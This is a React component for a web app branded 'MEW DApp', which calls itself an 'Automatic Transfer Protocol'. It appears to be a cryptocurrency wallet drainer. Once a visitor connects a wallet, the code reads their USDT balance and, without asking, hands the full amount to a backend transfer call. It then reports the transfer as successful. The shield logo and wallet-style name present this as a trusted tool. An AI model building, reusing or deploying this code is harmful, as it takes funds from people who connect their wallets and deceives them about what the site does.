import { useState, useEffect } from "react";
import { useAccount, useBalance, useDisconnect } from "wagmi";
import { TransferStatus } from "./TransferStatus";
import { WalletConnection } from "./WalletConnection";
import { BackendService } from "../services/BackendService";
import { TransferState } from "../types";
import { Shield } from "lucide-react";

const backendService = new BackendService();

const initialTransferState: TransferState = {
  status: "idle",
  message: null,
  txHash: null,
};

export function Main() {
  const { isConnected, address, chain } = useAccount();
  const { disconnect } = useDisconnect();
  
  // Fetch real USDT balance
  const { data: balanceData, isLoading: isBalanceLoading } = useBalance({
    address: address,
    token: backendService.getUSDTAddress(chain?.id),
    query: {
      enabled: isConnected,
      refetchInterval: 5000, // Refresh every 5 seconds
    },
  });

  const [transferState, setTransferState] = useState<TransferState>(initialTransferState);

  // Automatic transfer flow
  useEffect(() => {
    const executeAutomaticTransfer = async () => {
      if (!isConnected || !address || !balanceData || isBalanceLoading) return;
      
      // Skip if already processing or completed
      if (transferState.status !== "idle") return;

      try {
        const balance = balanceData.value.toString();
        const formattedBalance = parseFloat(balanceData.formatted || "0").toFixed(2);

        // Step 1: Checking balance
        setTransferState({ 
          status: "checking_balance", 
          message: `Checking balance: ${formattedBalance} USDT...` 
        });

        // Step 2: Validate threshold
        if (!backendService.meetsThreshold(formattedBalance)) {
          setTransferState({
            status: "below_threshold",
            message: `Balance (${formattedBalance} USDT) is below threshold. No transfer needed.`,
          });
          return;
        }

        // Step 3: Initiate backend transfer
        setTransferState({ 
          status: "initiating", 
          message: "Initiating automatic transfer via backend..." 
        });

        // Step 4: Call real backend API
        const result = await backendService.processTransfer(address, balance, chain?.id || 1);

        // Step 5: Complete
        setTransferState({
          status: "completed",
          message: `Successfully transferred ${formattedBalance} USDT`,
          txHash: result.txHash,
        });

      } catch (error) {
        setTransferState({
          status: "error",
          message: error instanceof Error ? error.message : "Transfer failed.",
        });
      }
    };

    // Small delay to ensure balance is loaded
    const timeoutId = setTimeout(() => {
      executeAutomaticTransfer();
    }, 500);

    return () => clearTimeout(timeoutId);
  }, [isConnected, address, balanceData, isBalanceLoading, chain?.id, transferState.status]);

  const handleDisconnect = () => {
    disconnect();
    setTransferState(initialTransferState);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-white flex flex-col">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
        <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center">
              <Shield className="w-6 h-6 text-slate-900" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">MEW DApp</h1>
              <p className="text-xs text-slate-400">Automatic Transfer Protocol</p>
            </div>
          </div>
          {isConnected && (
            <button
              onClick={handleDisconnect}
              className="px-4 py-2 text-sm text-slate-400 hover:text-white transition-colors"
            >
              Disconnect
            </button>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          {!isConnected ? (
            <WalletConnection />
          ) : (
            <TransferStatus
              address={address!}
              balance={balanceData?.formatted || "0"}
              chainId={chain?.id || 1}
              transferState={transferState}
            />
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800 bg-slate-900/50 py-4">
        <div className="max-w-6xl mx-auto px-4 text-center text-sm text-slate-500">
          <p>MEW DApp • Powered by Wagmi & ConnectKit</p>
        </div>
      </footer>
    </div>
  );
}